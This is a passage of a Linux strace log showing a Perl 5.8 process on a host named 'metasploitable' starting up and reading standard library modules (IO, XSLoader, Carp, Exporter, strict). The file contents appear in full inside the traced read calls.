\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
13033 07:45:20.039842 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
13033 07:45:20.039858 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d55000
13033 07:45:20.039870 mmap2(0xb7d5e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d5e000
13033 07:45:20.039884 mmap2(0xb7d60000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d60000
13033 07:45:20.039898 close(1)          = 0
13033 07:45:20.039921 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d54000
13033 07:45:20.039934 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d548c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
13033 07:45:20.039990 mprotect(0xb7ed0000, 4096, PROT_READ) = 0
13033 07:45:20.040017 munmap(0xb7f18000, 29913) = 0
13033 07:45:20.040029 set_tid_address(0xb7d54908) = 13033
13033 07:45:20.040038 set_robust_list(0xb7d54910, 0xc) = 0
13033 07:45:20.040048 futex(0xbfcac140, 0x81 /* FUTEX_??? */, 1) = 0
13033 07:45:20.040061 rt_sigaction(SIGRTMIN, {0xb7eda2c0, [], SA_SIGINFO}, NULL, 8) = 0
13033 07:45:20.040075 rt_sigaction(SIGRT_1, {0xb7eda340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
13033 07:45:20.040087 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
13033 07:45:20.040101 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
13033 07:45:20.040119 uname({sys="Linux", node="metasploitable", ...}) = 0
13033 07:45:20.040165 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
13033 07:45:20.040254 brk(0)            = 0x8153000
13033 07:45:20.040265 brk(0x8174000)    = 0x8174000
13033 07:45:20.040311 getuid32()        = 0
13033 07:45:20.040321 geteuid32()       = 0
13033 07:45:20.040330 getgid32()        = 0
13033 07:45:20.040339 getegid32()       = 0
13033 07:45:20.040375 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d33000
13033 07:45:20.040402 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
13033 07:45:20.040418 read(1, "\354\301J\307", 4) = 4
13033 07:45:20.040431 close(1)          = 0
13033 07:45:20.040450 time(NULL)        = 1495626320
13033 07:45:20.040492 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfcabe10) = -1 ENOENT (No such file or directory)
13033 07:45:20.040509 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfcabe10) = -1 ENOENT (No such file or directory)
13033 07:45:20.040528 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfcabe10) = -1 ENOENT (No such file or directory)
13033 07:45:20.040544 stat64("/usr/local/lib/perl/5.8.7", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040556 stat64("/usr/local/share/perl/5.8.7", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040569 stat64("/usr/local/lib/perl/5.8.6", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040580 stat64("/usr/local/share/perl/5.8.6", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040592 stat64("/usr/local/lib/perl/5.8.4", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040603 stat64("/usr/local/share/perl/5.8.4", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040616 stat64("/usr/local/lib/perl/5.8.3", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040627 stat64("/usr/local/share/perl/5.8.3", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040639 stat64("/usr/local/lib/perl/5.8.2", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040651 stat64("/usr/local/share/perl/5.8.2", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040662 stat64("/usr/local/lib/perl/5.8.1", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040674 stat64("/usr/local/share/perl/5.8.1", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040686 stat64("/usr/local/lib/perl/5.8.0", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040705 stat64("/usr/local/share/perl/5.8.0", 0xbfcabf50) = -1 ENOENT (No such file or directory)
13033 07:45:20.040729 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabc48) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.040741 _llseek(0, 0, [0], SEEK_CUR) = 0
13033 07:45:20.040753 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabc48) = -1 EBADF (Bad file descriptor)
13033 07:45:20.040764 _llseek(1, 0, 0xbfcabc90, SEEK_CUR) = -1 EBADF (Bad file descriptor)
13033 07:45:20.040775 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabc48) = -1 EINVAL (Invalid argument)
13033 07:45:20.040785 _llseek(2, 0, 0xbfcabc90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
13033 07:45:20.040796 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
13033 07:45:20.040808 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabd08) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.040818 _llseek(1, 0, [0], SEEK_CUR) = 0
13033 07:45:20.040829 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
13033 07:45:20.040841 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
13033 07:45:20.040859 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
13033 07:45:20.040912 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
13033 07:45:20.040954 getppid()         = 13031
13033 07:45:20.041015 stat64("/etc/perl/IO.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.041029 stat64("/etc/perl/IO.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041042 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.041055 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041068 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.041080 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041094 stat64("/usr/lib/perl5/IO.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.041106 stat64("/usr/lib/perl5/IO.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041119 stat64("/usr/share/perl5/IO.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.041131 stat64("/usr/share/perl5/IO.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041144 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.041157 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
13033 07:45:20.041183 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.041206 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.041218 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.041242 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
13033 07:45:20.041299 stat64("/etc/perl/XSLoader.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041312 stat64("/etc/perl/XSLoader.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041325 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041338 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041352 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041365 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041379 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041390 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041404 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041415 stat64("/usr/share/perl5/XSLoader.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041429 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.041441 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
13033 07:45:20.041461 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.041475 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.041486 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.041505 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
13033 07:45:20.041795 brk(0x8195000)    = 0x8195000
13033 07:45:20.042119 _llseek(8, 3407, [3407], SEEK_SET) = 0
13033 07:45:20.048344 _llseek(8, 0, [3407], SEEK_CUR) = 0
13033 07:45:20.048344 close(8)          = 0
13033 07:45:20.048344 stat64("/etc/perl/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048345 stat64("/etc/perl/Carp.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048345 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048345 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048356 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048368 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048382 stat64("/usr/lib/perl5/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048393 stat64("/usr/lib/perl5/Carp.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048406 stat64("/usr/share/perl5/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048417 stat64("/usr/share/perl5/Carp.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048430 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048442 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048455 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.048468 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
13033 07:45:20.048488 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.048502 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.048513 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.048530 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
13033 07:45:20.049001 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
13033 07:45:20.049029 read(8, "", 4096) = 0
13033 07:45:20.049040 close(8)          = 0
13033 07:45:20.049061 stat64("/etc/perl/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049075 stat64("/etc/perl/Exporter.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049088 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049100 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049114 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049193 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049208 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049234 stat64("/usr/lib/perl5/Exporter.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049246 stat64("/usr/share/perl5/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049258 stat64("/usr/share/perl5/Exporter.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049271 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049283 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049296 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049309 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
13033 07:45:20.049329 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.049343 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.049354 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.049371 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
13033 07:45:20.049852 _llseek(8, 2217, [2217], SEEK_SET) = 0
13033 07:45:20.049869 _llseek(8, 0, [2217], SEEK_CUR) = 0
13033 07:45:20.049880 close(8)          = 0
13033 07:45:20.049954 stat64("/etc/perl/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049971 stat64("/etc/perl/strict.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049984 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.049996 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050010 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050022 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050036 stat64("/usr/lib/perl5/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050047 stat64("/usr/lib/perl5/strict.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050060 stat64("/usr/share/perl5/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050071 stat64("/usr/share/perl5/strict.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050084 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050096 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050109 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050191 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
13033 07:45:20.050230 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.050244 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.050256 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.050289 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
13033 07:45:20.050427 _llseek(8, 598, [598], SEEK_SET) = 0
13033 07:45:20.050441 _llseek(8, 0, [598], SEEK_CUR) = 0
13033 07:45:20.050450 close(8)          = 0
13033 07:45:20.050488 stat64("/etc/perl/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050502 stat64("/etc/perl/warnings.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050515 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050528 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.050541 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
